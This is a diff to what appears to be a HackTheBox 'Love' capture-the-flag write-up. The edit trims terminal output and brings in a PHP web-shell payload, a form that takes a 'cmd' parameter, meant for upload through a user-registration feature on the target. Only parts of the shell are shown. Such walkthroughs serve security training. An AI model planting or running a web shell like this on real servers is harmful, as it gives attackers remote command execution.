@@ -231,12 +231,9 @@ Lets try to create another candidate ```Sensei```, but this time we'll upload a 
 
 nice nice, lets take this up a notch by trying to upload a php file
 
-```
-┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/love]
-└─$ nano vawulence.php 
-                                                                                                                                                                                                                                             
-┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/love]
-└─$ cat vawulence.php 
+I'll be using this payload for my php script
+
+```php
 <html>
 <body>
 <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
@@ -255,7 +252,7 @@ nice nice, lets take this up a notch by trying to upload a php file
 <script>document.getElementById("cmd").focus();</script>
 </html>
 ```
-That's the content of my php file. So we\ll try to upload this.
+Save that in a file. Then we'll try to upload this.
 
 Now, lets create another user ```vizards```, but this time we'll be uploading a php script
 
